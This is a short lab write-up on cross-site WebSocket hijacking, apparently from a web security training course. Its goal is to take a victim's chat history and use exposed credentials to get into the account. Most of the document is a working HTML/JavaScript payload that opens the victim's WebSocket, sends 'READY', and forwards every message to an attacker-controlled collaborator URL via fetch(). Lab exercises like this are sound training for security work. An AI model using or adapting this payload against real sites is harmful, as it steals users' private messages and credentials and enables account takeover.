# Lab 03 — Cross-Site WebSocket Hijacking

## Goal
Exfiltrate the victim's chat history and use exposed credentials to access the account.

The lab shows that `READY` retrieves chat history and that the handshake lacks CSRF tokens.

```html
<script>
var ws = new WebSocket('wss://your-websocket-url');
ws.onopen = function() {
    ws.send("READY");
};
ws.onmessage = function(event) {
    fetch('https://your-collaborator-url', {
        method: 'POST',
        mode: 'no-cors',
        body: event.data
    });
};
</script>
```

Replace the WebSocket URL with the lab handshake URL and use Burp Collaborator for the receiving URL.
